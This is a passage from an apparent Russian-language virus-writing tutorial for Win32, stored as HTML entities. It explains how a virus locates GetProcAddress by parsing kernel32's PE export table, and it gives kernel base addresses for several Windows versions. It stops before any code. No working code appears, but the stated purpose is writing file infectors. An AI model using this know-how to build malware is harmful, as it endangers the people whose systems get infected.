&#1091;&#1090;&#1074;&#1077;&#1088;&#1078;&#1076;&#1077;&#1085;&#1080;&#1103;,
&#1089;&#1076;&#1077;&#1083;&#1072;&#1085;&#1085;&#1099;&#1077;
&#1087;&#1088;&#1080;
&#1088;&#1072;&#1079;&#1088;&#1072;&#1073;&#1086;&#1090;&#1082;&#1077; Win95 (&#1082;&#1086;&#1090;&#1086;&#1088;&#1072;&#1103;,
&#1087;&#1086;&#1093;&#1086;&#1078;&#1077;,
&#1085;&#1072;&#1080;&#1084;&#1077;&#1085;&#1077;&#1077;
&#1074;&#1089;&#1077;&#1075;&#1086;
&#1089;&#1086;&#1086;&#1090;&#1074;&#1077;&#1090;&#1089;&#1090;&#1074;&#1091;&#1077;&#1090;
&#1091;&#1090;&#1074;&#1077;&#1088;&#1078;&#1076;&#1077;&#1085;&#1080;&#1102;,
&#1095;&#1090;&#1086; &quot;Win32-&#1087;&#1083;&#1072;&#1090;&#1092;&#1086;&#1088;&#1084;&#1099;
&#1085;&#1077; &#1084;&#1086;&#1075;&#1091;&#1090; &#1073;&#1099;&#1090;&#1100;
&#1087;&#1086;&#1076;&#1074;&#1077;&#1088;&#1075;&#1085;&#1091;&#1090;&#1099;
&#1079;&#1072;&#1088;&#1072;&#1078;&#1077;&#1085;&#1080;&#1102;&quot;),
&#1085;&#1072; &#1090;&#1086;&#1084;, &#1095;&#1090;&#1086;
&#1077;&#1089;&#1083;&#1080; &#1086;&#1085;&#1080;
&#1087;&#1077;&#1088;&#1077;&#1082;&#1088;&#1086;&#1102;&#1090;
&#1076;&#1086;&#1089;&#1090;&#1091;&#1087; &#1082;&#1086;
&#1074;&#1089;&#1077;&#1084;&#1091;, &#1095;&#1090;&#1086;
&#1086;&#1073;&#1099;&#1095;&#1085;&#1086;
&#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1091;&#1102;&#1090;
&#1074;&#1080;&#1088;&#1091;&#1089;&#1099;, &#1086;&#1085;&#1080;
&#1089;&#1084;&#1086;&#1075;&#1091;&#1090;
&#1087;&#1086;&#1073;&#1077;&#1076;&#1080;&#1090;&#1100; &#1085;&#1072;&#1089;.
&#1042; &#1080;&#1093; &#1084;&#1077;&#1095;&#1090;&#1072;&#1093;.
&#1054;&#1085;&#1080; &#1076;&#1091;&#1084;&#1072;&#1083;&#1080;,
&#1095;&#1090;&#1086; &#1084;&#1099; &#1085;&#1077;
&#1089;&#1084;&#1086;&#1078;&#1077;&#1084;
&#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1090;&#1100;
&#1080;&#1093; API, &#1080; &#1073;&#1086;&#1083;&#1077;&#1077;
&#1090;&#1086;&#1075;&#1086;, &#1086;&#1085;&#1080; &#1085;&#1077;
&#1084;&#1086;&#1075;&#1083;&#1080;
&#1087;&#1088;&#1077;&#1076;&#1089;&#1090;&#1072;&#1074;&#1080;&#1090;&#1100;,
&#1095;&#1090;&#1086; &#1084;&#1099;
&#1087;&#1086;&#1087;&#1072;&#1076;&#1077;&#1084; &#1074; Ring-0, &#1085;&#1086;
&#1101;&#1090;&#1086; &#1091;&#1078;&#1077;
&#1076;&#1088;&#1091;&#1075;&#1072;&#1103;
&#1080;&#1089;&#1090;&#1086;&#1088;&#1080;&#1103;.
<p>&#1051;&#1072;&#1076;&#1085;&#1086;, &#1082;&#1072;&#1082;
&#1073;&#1099;&#1083;&#1086; &#1089;&#1082;&#1072;&#1079;&#1072;&#1085;&#1086;
&#1088;&#1072;&#1085;&#1077;&#1077;, &#1091; &#1085;&#1072;&#1089;
&#1077;&#1089;&#1090;&#1100;
&#1086;&#1073;&#1098;&#1103;&#1074;&#1083;&#1077;&#1085;&#1085;&#1086;&#1077;
&#1082;&#1072;&#1082; &#1074;&#1085;&#1077;&#1096;&#1085;&#1077;&#1077;
&#1080;&#1084;&#1103; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; API,
&#1087;&#1086;&#1101;&#1090;&#1086;&#1084;&#1091; import32.lib
&#1076;&#1072;&#1089;&#1090; &#1085;&#1072;&#1084;
&#1072;&#1076;&#1088;&#1077;&#1089;
&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; &#1080; &#1101;&#1090;&#1086;
&#1073;&#1091;&#1076;&#1077;&#1090;
&#1087;&#1088;&#1072;&#1074;&#1080;&#1083;&#1100;&#1085;&#1099;&#1084;
&#1086;&#1073;&#1088;&#1072;&#1079;&#1086;&#1084;
&#1089;&#1082;&#1086;&#1084;&#1087;&#1080;&#1083;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1085;&#1086;
&#1074; &#1082;&#1086;&#1076;, &#1085;&#1086; &#1091; &#1085;&#1072;&#1089;
&#1087;&#1086;&#1103;&#1074;&#1103;&#1090;&#1089;&#1103;
&#1087;&#1088;&#1086;&#1073;&#1083;&#1077;&#1084;&#1099; &#1087;&#1088;&#1080;
&#1085;&#1072;&#1087;&#1080;&#1089;&#1072;&#1085;&#1080;&#1080;
&#1074;&#1080;&#1088;&#1091;&#1089;&#1086;&#1074;. &#1045;&#1089;&#1083;&#1080;
&#1084;&#1099; &#1073;&#1091;&#1076;&#1077;&#1084;
&#1089;&#1089;&#1099;&#1083;&#1072;&#1090;&#1100;&#1089;&#1103; &#1085;&#1072;
&#1092;&#1080;&#1082;&#1089;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1085;&#1099;&#1077;
&#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1080;&#1103;
&#1101;&#1090;&#1080;&#1093; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1081;,
&#1090;&#1086; &#1086;&#1095;&#1077;&#1085;&#1100;
&#1074;&#1077;&#1088;&#1086;&#1103;&#1090;&#1085;&#1086;, &#1095;&#1090;&#1086;
&#1101;&#1090;&#1086;&#1090; &#1072;&#1076;&#1088;&#1077;&#1089; &#1085;&#1077;
&#1073;&#1091;&#1076;&#1077;&#1090;
&#1088;&#1072;&#1073;&#1086;&#1090;&#1072;&#1090;&#1100; &#1074;
&#1089;&#1083;&#1077;&#1076;&#1091;&#1102;&#1097;&#1077;&#1081;
&#1074;&#1077;&#1088;&#1089;&#1080;&#1080; Win32. &#1042;&#1099;
&#1084;&#1086;&#1078;&#1077;&#1090;&#1077; &#1085;&#1072;&#1081;&#1090;&#1080;
&#1087;&#1088;&#1080;&#1084;&#1077;&#1088; &#1074; Bizatch.
&#1063;&#1090;&#1086; &#1085;&#1072;&#1084; &#1085;&#1091;&#1078;&#1085;&#1086;
&#1089;&#1076;&#1077;&#1083;&#1072;&#1090;&#1100;? &#1059; &#1085;&#1072;&#1089;
&#1077;&#1089;&#1090;&#1100; &#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1103;
&#1087;&#1086;&#1076;
&#1085;&#1072;&#1079;&#1074;&#1072;&#1085;&#1080;&#1077;&#1084; GetProcAddress,
&#1082;&#1086;&#1090;&#1086;&#1088;&#1072;&#1103;
&#1074;&#1086;&#1079;&#1074;&#1088;&#1072;&#1097;&#1072;&#1077;&#1090;
&#1072;&#1076;&#1088;&#1077;&#1089; &#1085;&#1091;&#1078;&#1085;&#1086;&#1081;
&#1085;&#1072;&#1084; API-&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;.
&#1042;&#1099; &#1084;&#1086;&#1078;&#1077;&#1090;&#1077;
&#1079;&#1072;&#1084;&#1077;&#1090;&#1080;&#1090;&#1100;, &#1095;&#1090;&#1086;
GetProcAddress &#1090;&#1086;&#1078;&#1077;
&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1103; API, &#1082;&#1072;&#1082;
&#1078;&#1077; &#1084;&#1099; &#1084;&#1086;&#1078;&#1077;&#1084;
&#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1090;&#1100;
&#1077;&#1077;? &#1059; &#1085;&#1072;&#1089; &#1077;&#1089;&#1090;&#1100;
&#1085;&#1077;&#1089;&#1082;&#1086;&#1083;&#1100;&#1082;&#1086;
&#1087;&#1091;&#1090;&#1077;&#1081;
&#1089;&#1076;&#1077;&#1083;&#1072;&#1090;&#1100; &#1101;&#1090;&#1086;, &#1080;
&#1103; &#1087;&#1086;&#1082;&#1072;&#1078;&#1091; &#1074;&#1072;&#1084;
&#1076;&#1074;&#1072; &#1089;&#1072;&#1084;&#1099;&#1093;
&#1083;&#1091;&#1095;&#1096;&#1080;&#1093; (&#1085;&#1072; &#1084;&#1086;&#1081;
&#1074;&#1079;&#1075;&#1083;&#1103;&#1076;) &#1080;&#1079; &#1085;&#1080;&#1093;:
<p>1. &#1055;&#1086;&#1080;&#1089;&#1082; GetProcessAddress &#1074;
&#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1077;
&#1101;&#1082;&#1089;&#1087;&#1086;&#1088;&#1090;&#1086;&#1074;.<br>
2. &#1042;
&#1079;&#1072;&#1088;&#1072;&#1078;&#1077;&#1085;&#1085;&#1086;&#1084;
&#1092;&#1072;&#1081;&#1083;&#1077; &#1080;&#1097;&#1077;&#1084;
&#1089;&#1088;&#1077;&#1076;&#1080;
&#1080;&#1084;&#1087;&#1086;&#1088;&#1090;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1085;&#1099;&#1093;
&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1081; GetProcAddress.
<p>&#1057;&#1072;&#1084;&#1099;&#1081;
&#1087;&#1088;&#1086;&#1089;&#1090;&#1086;&#1081; &#1087;&#1091;&#1090;&#1100; -
&#1087;&#1077;&#1088;&#1074;&#1099;&#1081;,
&#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081; &#1103;
&#1087;&#1077;&#1088;&#1074;&#1099;&#1084; &#1080;
&#1086;&#1073;&#1098;&#1103;&#1089;&#1085;&#1102; :).
&#1057;&#1085;&#1072;&#1095;&#1072;&#1083;&#1072;
&#1085;&#1077;&#1084;&#1085;&#1086;&#1075;&#1086;
&#1090;&#1077;&#1086;&#1088;&#1080;&#1080;, &#1072;
&#1087;&#1086;&#1090;&#1086;&#1084; &#1082;&#1086;&#1076;.
<p>&#1045;&#1089;&#1083;&#1080; &#1074;&#1099;
&#1074;&#1079;&#1075;&#1083;&#1103;&#1085;&#1077;&#1090;&#1077; &#1085;&#1072;
&#1092;&#1086;&#1088;&#1084;&#1072;&#1090;
&#1079;&#1072;&#1075;&#1086;&#1083;&#1086;&#1074;&#1082;&#1072; PE,
&#1090;&#1086; &#1091;&#1074;&#1080;&#1076;&#1080;&#1090;&#1077;,
&#1095;&#1090;&#1086; &#1087;&#1086;
&#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1080;&#1102; 78h (&#1079;&#1072;&#1075;&#1086;&#1083;&#1086;&#1074;&#1082;&#1072;
PE, &#1072; &#1085;&#1077; &#1092;&#1072;&#1081;&#1083;&#1072;)
&#1085;&#1072;&#1093;&#1086;&#1076;&#1080;&#1090;&#1089;&#1103; RVA (&#1086;&#1090;&#1085;&#1086;&#1089;&#1080;&#1090;&#1077;&#1083;&#1100;&#1085;&#1099;&#1081;
&#1074;&#1080;&#1088;&#1090;&#1091;&#1072;&#1083;&#1100;&#1085;&#1099;&#1081;
&#1072;&#1076;&#1088;&#1077;&#1089;)
&#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1099;
&#1101;&#1082;&#1089;&#1087;&#1086;&#1088;&#1090;&#1086;&#1074;. &#1054;&#1082;,
&#1085;&#1072;&#1084; &#1085;&#1091;&#1078;&#1085;&#1086;
&#1087;&#1086;&#1083;&#1091;&#1095;&#1080;&#1090;&#1100;
&#1072;&#1076;&#1088;&#1077;&#1089;
&#1101;&#1082;&#1089;&#1087;&#1086;&#1088;&#1090;&#1086;&#1074;
&#1103;&#1076;&#1088;&#1072;. &#1042; Windows 95/98 &#1101;&#1090;&#1086;&#1090;
&#1072;&#1076;&#1088;&#1077;&#1089; &#1088;&#1072;&#1074;&#1077;&#1085;
0BFF70000h, &#1072; &#1074; Windows NT &#1086;&#1085;&#1086;
&#1088;&#1072;&#1074;&#1085;&#1086; 077F00000h. &#1042; Win2k &#1091;
&#1085;&#1072;&#1089; &#1073;&#1091;&#1076;&#1077;&#1090;
&#1072;&#1076;&#1088;&#1077;&#1089; 077E00000h.
&#1055;&#1086;&#1101;&#1090;&#1086;&#1084;&#1091;
&#1089;&#1085;&#1072;&#1095;&#1072;&#1083;&#1072; &#1084;&#1099;
&#1076;&#1086;&#1083;&#1078;&#1085;&#1099;
&#1079;&#1072;&#1075;&#1088;&#1091;&#1079;&#1080;&#1090;&#1100;
&#1072;&#1076;&#1088;&#1077;&#1089;
&#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1099; &#1074;
&#1088;&#1077;&#1075;&#1080;&#1089;&#1090;&#1088;,
&#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081;
&#1073;&#1091;&#1076;&#1077;&#1084;
&#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1090;&#1100;
&#1082;&#1072;&#1082;
&#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1100;. &#1071;
&#1085;&#1072;&#1089;&#1090;&#1086;&#1103;&#1090;&#1077;&#1083;&#1100;&#1085;&#1086;
&#1088;&#1077;&#1082;&#1086;&#1084;&#1077;&#1085;&#1076;&#1091;&#1102; ESI,
&#1087;&#1086;&#1090;&#1086;&#1084;&#1091; &#1095;&#1090;&#1086;
&#1090;&#1086;&#1075;&#1076;&#1072; &#1084;&#1099;
&#1084;&#1086;&#1078;&#1077;&#1084;
&#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1090;&#1100;
LODSD.
<p>&#1052;&#1099;
&#1087;&#1088;&#1086;&#1074;&#1077;&#1088;&#1103;&#1077;&#1084;,
&#1085;&#1072;&#1093;&#1086;&#1076;&#1080;&#1090;&#1089;&#1103; &#1083;&#1080;
&#1074; &#1085;&#1072;&#1095;&#1072;&#1083;&#1077;
&#1089;&#1083;&#1086;&#1074;&#1072; &quot;MZ&quot; (&#1083;&#1072;&#1076;&#1085;&#1086;-&#1083;&#1072;&#1076;&#1085;&#1086;,
&quot;ZM&quot;, &#1095;&#1077;&#1088;&#1090;
&#1087;&#1086;&#1073;&#1077;&#1088;&#1080; &#1101;&#1090;&#1091;
&#1080;&#1085;&#1090;&#1077;&#1083;&#1086;&#1074;&#1089;&#1082;&#1091;&#1102;
&#1072;&#1088;&#1093;&#1080;&#1090;&#1077;&#1082;&#1090;&#1091;&#1088;&#1091;
&#1087;&#1088;&#1086;&#1094;&#1077;&#1089;&#1089;&#1086;&#1088;&#1072; :) ),
&#1087;&#1086;&#1090;&#1086;&#1084;&#1091; &#1095;&#1090;&#1086;
&#1103;&#1076;&#1088;&#1086; - &#1101;&#1090;&#1086;
&#1073;&#1080;&#1073;&#1083;&#1080;&#1086;&#1090;&#1077;&#1082;&#1072; (.DLL),
&#1072; &#1091; &#1085;&#1080;&#1093; &#1090;&#1086;&#1078;&#1077;
&#1077;&#1089;&#1090;&#1100; PE-&#1079;&#1072;&#1075;&#1086;&#1083;&#1086;&#1074;&#1086;&#1082;,
&#1080; &#1082;&#1072;&#1082; &#1084;&#1099; &#1084;&#1086;&#1075;&#1083;&#1080;
&#1074;&#1080;&#1076;&#1077;&#1090;&#1100; &#1088;&#1072;&#1085;&#1077;&#1077;,
&#1095;&#1072;&#1089;&#1090;&#1100; &#1077;&#1075;&#1086;
&#1089;&#1083;&#1091;&#1078;&#1080;&#1090;&#1100; &#1076;&#1083;&#1103;
&#1089;&#1086;&#1074;&#1084;&#1077;&#1089;&#1090;&#1080;&#1084;&#1086;&#1089;&#1090;&#1080;
&#1089; DOS. &#1055;&#1086;&#1089;&#1083;&#1077;
&#1076;&#1072;&#1085;&#1085;&#1086;&#1075;&#1086;
&#1089;&#1088;&#1072;&#1074;&#1085;&#1077;&#1085;&#1080;&#1103;
&#1076;&#1072;&#1074;&#1072;&#1081;&#1090;&#1077;
&#1087;&#1088;&#1086;&#1074;&#1077;&#1088;&#1080;&#1084;,
&#1076;&#1077;&#1081;&#1089;&#1090;&#1074;&#1080;&#1090;&#1077;&#1083;&#1100;&#1085;&#1086;&#1083;&#1080;
&#1101;&#1090;&#1086; PE, &#1087;&#1086;&#1101;&#1090;&#1086;&#1084;&#1091;
&#1084;&#1099; &#1089;&#1084;&#1086;&#1090;&#1088;&#1080;&#1084;
&#1103;&#1095;&#1077;&#1081;&#1082;&#1091;
&#1087;&#1072;&#1084;&#1103;&#1090;&#1080; &#1087;&#1086;
&#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1080;&#1102;
&#1072;&#1076;&#1088;&#1077;&#1089;_&#1073;&#1072;&#1079;&#1099;+[3Ch] (&#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1080;&#1077;,
&#1086;&#1090;&#1082;&#1091;&#1076;&#1072;
&#1085;&#1072;&#1095;&#1080;&#1085;&#1072;&#1077;&#1090;&#1089;&#1103;
&#1103;&#1076;&#1088;&#1086; + &#1072;&#1076;&#1088;&#1077;&#1089;,
&#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081;
&#1085;&#1072;&#1093;&#1086;&#1076;&#1080;&#1090;&#1089;&#1103; &#1087;&#1086;
&#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1102; 3Ch &#1074; PE-&#1079;&#1072;&#1075;&#1086;&#1083;&#1086;&#1074;&#1082;&#1077;)
&#1080; &#1089;&#1088;&#1072;&#1074;&#1085;&#1080;&#1074;&#1072;&#1077;&#1084;
&#1089; &quot;PE\0\0&quot; (&#1089;&#1080;&#1075;&#1085;&#1072;&#1090;&#1091;&#1088;&#1086;&#1081;
PE).
<p>&#1045;&#1089;&#1083;&#1080; &#1074;&#1089;&#1077;
&#1093;&#1086;&#1088;&#1086;&#1096;&#1086;, &#1090;&#1086;&#1075;&#1076;&#1072;
&#1080;&#1076;&#1077;&#1084; &#1076;&#1072;&#1083;&#1100;&#1096;&#1077;.
&#1053;&#1072;&#1084; &#1085;&#1091;&#1078;&#1077;&#1085; RVA
&#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1099;
&#1101;&#1082;&#1089;&#1087;&#1086;&#1088;&#1090;&#1086;&#1074;.
&#1050;&#1072;&#1082; &#1074;&#1099; &#1084;&#1086;&#1078;&#1077;&#1090;&#1077;
&#1074;&#1080;&#1076;&#1077;&#1090;&#1100;, &#1086;&#1085;
&#1085;&#1072;&#1093;&#1086;&#1076;&#1080;&#1090;&#1089;&#1103; &#1087;&#1086;
&#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1080;&#1102; 78h &#1074;
&#1079;&#1072;&#1075;&#1086;&#1083;&#1086;&#1074;&#1082;&#1077; PE -
&#1074;&#1086;&#1090; &#1084;&#1099; &#1077;&#1075;&#1086; &#1080;
&#1087;&#1086;&#1083;&#1091;&#1095;&#1080;&#1083;&#1080;. &#1053;&#1086;
&#1082;&#1072;&#1082; &#1074;&#1099; &#1079;&#1085;&#1072;&#1077;&#1090;&#1077;,
RVA (&#1086;&#1090;&#1085;&#1086;&#1089;&#1080;&#1090;&#1077;&#1083;&#1100;&#1085;&#1099;&#1081;
&#1074;&#1080;&#1088;&#1090;&#1091;&#1072;&#1083;&#1100;&#1085;&#1099;&#1081;
&#1072;&#1076;&#1088;&#1077;&#1089;),
&#1089;&#1086;&#1075;&#1083;&#1072;&#1089;&#1085;&#1086;
&#1089;&#1074;&#1086;&#1077;&#1084;&#1091; &#1080;&#1084;&#1077;&#1085;&#1080;,
&#1086;&#1090;&#1085;&#1086;&#1089;&#1080;&#1090;&#1077;&#1083;&#1100;&#1085;&#1086;
&#1086;&#1087;&#1088;&#1077;&#1076;&#1077;&#1083;&#1077;&#1085;&#1085;&#1086;&#1075;&#1086;
&#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1080;&#1103;, &#1074;
&#1076;&#1072;&#1085;&#1085;&#1086;&#1084;
&#1089;&#1083;&#1091;&#1095;&#1072;&#1077; - &#1073;&#1072;&#1079;&#1099;
&#1086;&#1073;&#1088;&#1072;&#1079;&#1072; &#1103;&#1076;&#1088;&#1072;.
&#1042;&#1089;&#1077; &#1086;&#1095;&#1077;&#1085;&#1100;
&#1087;&#1088;&#1086;&#1089;&#1090;&#1086;:
&#1087;&#1088;&#1086;&#1089;&#1090;&#1086;
&#1076;&#1086;&#1073;&#1072;&#1074;&#1100;&#1090;&#1077;
&#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1080;&#1077;
&#1103;&#1076;&#1088;&#1072; &#1082;
&#1085;&#1072;&#1081;&#1076;&#1077;&#1085;&#1085;&#1086;&#1084;&#1091;
&#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1102;.
&#1061;&#1086;&#1088;&#1086;&#1096;&#1086;.
&#1058;&#1077;&#1087;&#1077;&#1088;&#1100; &#1084;&#1099;
&#1085;&#1072;&#1093;&#1086;&#1076;&#1080;&#1084;&#1089;&#1103; &#1074;
&#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1077;
&#1101;&#1082;&#1089;&#1087;&#1086;&#1088;&#1090;&#1072; :).
<p>&#1044;&#1072;&#1074;&#1072;&#1081;&#1090;&#1077;
&#1087;&#1086;&#1089;&#1084;&#1086;&#1090;&#1088;&#1080;&#1084; &#1077;&#1077;
&#1092;&#1086;&#1088;&#1084;&#1072;&#1090;:
<p><img src="vgw04_p01.gif" width="499" height="270">
<p>&#1044;&#1083;&#1103; &#1085;&#1072;&#1089;
&#1074;&#1072;&#1078;&#1085;&#1099;
&#1087;&#1086;&#1089;&#1083;&#1077;&#1076;&#1085;&#1080;&#1077; 6
&#1087;&#1086;&#1083;&#1077;&#1081;.
&#1047;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1103; RVA
&#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1099;
&#1072;&#1076;&#1088;&#1077;&#1089;&#1086;&#1074;,
&#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1077;&#1081;
&#1085;&#1072; &#1080;&#1084;&#1077;&#1085;&#1072; &#1080;
&#1086;&#1088;&#1076;&#1080;&#1085;&#1072;&#1083;&#1086;&#1074;
&#1103;&#1074;&#1083;&#1103;&#1102;&#1090;&#1089;&#1103;
&#1086;&#1090;&#1085;&#1086;&#1089;&#1080;&#1090;&#1077;&#1083;&#1100;&#1085;&#1099;&#1084;&#1080;
&#1082; &#1073;&#1072;&#1079;&#1077; KERNEL32, &#1082;&#1072;&#1082;
&#1074;&#1099; &#1084;&#1086;&#1078;&#1077;&#1090;&#1077;
&#1087;&#1088;&#1077;&#1076;&#1087;&#1086;&#1083;&#1086;&#1078;&#1080;&#1090;&#1100;.
&#1055;&#1086;&#1101;&#1090;&#1086;&#1084;&#1091;
&#1087;&#1077;&#1088;&#1074;&#1099;&#1081; &#1096;&#1072;&#1075;,
&#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081; &#1084;&#1099;
&#1076;&#1086;&#1083;&#1078;&#1085;&#1099;
&#1087;&#1088;&#1077;&#1076;&#1087;&#1088;&#1080;&#1085;&#1103;&#1090;&#1100;
&#1076;&#1083;&#1103;
&#1087;&#1086;&#1083;&#1091;&#1095;&#1077;&#1085;&#1080;&#1103;
&#1072;&#1076;&#1088;&#1077;&#1089;&#1072; API, - &#1101;&#1090;&#1086;
&#1091;&#1079;&#1085;&#1072;&#1090;&#1100;
&#1087;&#1086;&#1079;&#1080;&#1094;&#1080;&#1102; &#1077;&#1075;&#1086;
&#1087;&#1086;&#1079;&#1080;&#1094;&#1080;&#1102; &#1074;
&#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1077;. &#1052;&#1099;
&#1089;&#1076;&#1077;&#1083;&#1072;&#1077;&#1084;
&#1087;&#1088;&#1086;&#1073;&#1077;&#1075; &#1087;&#1086;
&#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1077;
&#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1077;&#1081;
&#1085;&#1072; &#1080;&#1084;&#1077;&#1085;&#1072; &#1080;
&#1073;&#1091;&#1076;&#1077;&#1084;
&#1089;&#1088;&#1072;&#1074;&#1085;&#1080;&#1074;&#1072;&#1090;&#1100;
&#1089;&#1090;&#1088;&#1086;&#1082;&#1080;, &#1087;&#1086;&#1082;&#1072;
&#1085;&#1077;
&#1087;&#1088;&#1086;&#1080;&#1079;&#1086;&#1081;&#1076;&#1077;&#1090;
&#1089;&#1086;&#1074;&#1087;&#1072;&#1076;&#1077;&#1085;&#1080;&#1103; &#1089;
&#1080;&#1084;&#1077;&#1085;&#1077;&#1084;
&#1085;&#1091;&#1078;&#1085;&#1086;&#1081; &#1085;&#1072;&#1084;
&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080;.
&#1056;&#1072;&#1079;&#1084;&#1077;&#1088;
&#1089;&#1095;&#1077;&#1090;&#1095;&#1080;&#1082;&#1072;,
&#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081; &#1084;&#1099;
&#1073;&#1091;&#1076;&#1077;&#1084;
&#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1090;&#1100;,
&#1076;&#1086;&#1083;&#1078;&#1077;&#1085; &#1073;&#1099;&#1090;&#1100;
&#1073;&#1086;&#1083;&#1100;&#1096;&#1077; &#1073;&#1072;&#1081;&#1090;&#1072;.
<p>&#1054;&#1073;&#1088;&#1072;&#1090;&#1080;&#1090;&#1077;
&#1074;&#1085;&#1080;&#1084;&#1072;&#1085;&#1080;&#1077;: &#1103;
&#1087;&#1088;&#1077;&#1076;&#1087;&#1086;&#1083;&#1072;&#1075;&#1072;&#1102;,
&#1095;&#1090;&#1086; &#1074; &#1074;&#1099;
&#1089;&#1086;&#1093;&#1088;&#1072;&#1085;&#1103;&#1077;&#1090;&#1077; &#1074;
&#1089;&#1086;&#1086;&#1090;&#1074;&#1077;&#1090;&#1089;&#1090;&#1074;&#1091;&#1102;&#1097;&#1080;&#1093;
&#1087;&#1077;&#1088;&#1077;&#1084;&#1077;&#1085;&#1085;&#1099;&#1093; VA (RVA +
&#1072;&#1076;&#1088;&#1077;&#1089; &#1073;&#1072;&#1079;&#1099;
&#1086;&#1073;&#1088;&#1072;&#1079;&#1072;)
&#1090;&#1072;&#1073;&#1083;&#1080;&#1094;
&#1072;&#1076;&#1088;&#1077;&#1089;&#1086;&#1074;, &#1080;&#1084;&#1077;&#1085;
&#1080; &#1086;&#1088;&#1076;&#1080;&#1085;&#1072;&#1083;&#1086;&#1074;.
<p>&#1054;&#1082;,
&#1087;&#1088;&#1077;&#1076;&#1089;&#1090;&#1072;&#1074;&#1100;&#1090;&#1077;,
&#1095;&#1090;&#1086; &#1084;&#1099;
&#1087;&#1086;&#1083;&#1091;&#1095;&#1080;&#1083;&#1080; &#1080;&#1084;&#1103;
&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; API,
&#1082;&#1086;&#1090;&#1086;&#1088;&#1086;&#1077; &#1085;&#1072;&#1084;
&#1073;&#1099;&#1083;&#1086; &#1085;&#1091;&#1078;&#1085;&#1086;,
&#1087;&#1086;&#1101;&#1090;&#1086;&#1084;&#1091; &#1074;
&#1089;&#1095;&#1077;&#1090;&#1095;&#1080;&#1082;&#1077; &#1091;
&#1085;&#1072;&#1089; &#1073;&#1091;&#1076;&#1077;&#1090; &#1077;&#1077;
&#1087;&#1086;&#1079;&#1080;&#1094;&#1080;&#1103; &#1074;
&#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1077;
&#1091;&#1082;&#1072;&#1079;&#1072;&#1090;&#1077;&#1083;&#1077;&#1081;
&#1085;&#1072; &#1080;&#1084;&#1077;&#1085;&#1072;.
&#1051;&#1072;&#1076;&#1085;&#1086;, &#1090;&#1077;&#1087;&#1077;&#1088;&#1100;
&#1087;&#1086;&#1089;&#1083;&#1077;&#1076;&#1091;&#1077;&#1090;
&#1089;&#1072;&#1084;&#1072;&#1103;
&#1089;&#1083;&#1086;&#1078;&#1085;&#1072;&#1103;
&#1095;&#1072;&#1089;&#1090;&#1100; &#1076;&#1083;&#1103;
&#1085;&#1072;&#1095;&#1080;&#1085;&#1072;&#1102;&#1097;&#1080;&#1093; &#1074;
&#1087;&#1088;&#1086;&#1075;&#1088;&#1072;&#1084;&#1084;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1080;&#1080;
&#1087;&#1086;&#1076; Win32. &#1059; &#1085;&#1072;&#1089;
&#1077;&#1089;&#1090;&#1100; &#1089;&#1095;&#1077;&#1090;&#1095;&#1080;&#1082;
&#1080; &#1090;&#1077;&#1087;&#1077;&#1088;&#1100; &#1085;&#1072;&#1084;
&#1085;&#1091;&#1078;&#1085;&#1086; &#1085;&#1072;&#1081;&#1090;&#1080; &#1074;
&#1090;&#1072;&#1073;&#1083;&#1080;&#1094;&#1077;
&#1086;&#1088;&#1076;&#1080;&#1085;&#1072;&#1083;&#1086;&#1074; API,
&#1072;&#1076;&#1088;&#1077;&#1089;
&#1082;&#1086;&#1090;&#1086;&#1088;&#1086;&#1075;&#1086; &#1084;&#1099;
&#1093;&#1086;&#1090;&#1080;&#1084;
&#1087;&#1086;&#1083;&#1091;&#1095;&#1080;&#1090;&#1100;.
&#1055;&#1086;&#1089;&#1082;&#1086;&#1083;&#1100;&#1082;&#1091; &#1091;
&#1085;&#1072;&#1089; &#1077;&#1089;&#1090;&#1100;
